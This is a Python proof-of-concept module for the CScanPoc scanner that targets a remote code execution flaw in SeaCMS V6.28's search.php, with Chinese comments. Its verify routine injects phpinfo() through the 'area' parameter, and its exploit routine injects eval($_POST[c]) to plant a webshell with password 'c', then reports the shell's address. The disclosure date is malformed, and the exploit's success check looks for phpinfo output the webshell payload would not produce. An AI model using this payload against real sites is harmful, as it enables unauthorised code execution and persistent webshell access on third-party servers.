# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0004'  # 平台漏洞编号，留空
    name = '海洋CMS V6.28代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2016-12-207'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        漏洞文件:seacms/search.php
        parseif函数中： @eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");//就是这里了,@eval 可直接执行任意命令。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4180/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = 'V6.28'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bfdf7c63-2dad-4e62-8d5f-3a658d24bded'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/seacms/search.php?searchtype=5&tid=&area=phpinfo()'
            url = self.target + payload
            requests.get(url)
            verify_url = self.target + '/seacms/search.php'
            r = requests.get(verify_url)

            if 'PHP Version' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/seacms/search.php?searchtype=5&tid=&area=eval($_POST[c])'
            url = self.target + payload
            requests.get(url)
            verify_url = self.target + '/seacms/search.php'
            r = requests.get(verify_url)

            if 'PHP Version' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞 ，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
